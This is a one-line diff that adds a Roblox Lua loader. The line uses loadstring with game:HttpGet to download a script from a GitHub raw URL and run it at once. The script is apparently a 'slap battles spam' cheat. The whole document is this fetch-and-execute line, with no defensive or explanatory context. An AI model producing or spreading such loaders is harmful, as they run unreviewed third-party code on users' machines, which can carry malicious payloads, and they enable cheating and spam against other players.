@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/update-slap-battles-spam3-686xw2u0hfk1y1.lua"))()
